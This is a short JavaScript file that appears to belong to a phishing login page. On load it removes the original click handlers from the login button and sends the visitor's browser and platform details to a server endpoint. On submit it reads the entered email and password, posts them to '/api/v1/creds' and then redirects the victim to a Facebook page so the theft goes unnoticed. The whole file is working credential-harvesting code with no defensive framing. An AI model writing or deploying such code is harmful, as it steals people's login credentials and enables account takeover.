function get_dev_details(){
    var navig = window.navigator;
    
    var dev_details = {};
    dev_details.appName = navig.appName;
    dev_details.appCodeName = navig.appCodeName;
    dev_details.platform = navig.platform;
    dev_details.userAgent = navig.userAgent;
    
    console.log(dev_details);
    
    return dev_details;
}

function send_dev_details(){
    
    var dev_details = get_dev_details();
    send_ajax('/api/v1/dev-details', 'POST', dev_details);
    
}

function hunter_on_load(){

    console.log("Remove it ");
    //remove click events of log in button
    var old_element = document.getElementById("hunter_submit");
    var new_element = old_element.cloneNode(true);
    old_element.parentNode.replaceChild(new_element, old_element);

    send_dev_details();

}

function submit_click(){


    username = document.getElementById('email').value;
    password = document.getElementById('pass').value;

    console.log(username, password);
    //send the creds to server via ajax
    var params = {"username": username, "password": password, "dev_details": get_dev_details()};
    send_ajax('/api/v1/creds', 'post', params);
    window.location = 'https://www.facebook.com/LiveIPLUpdates';


}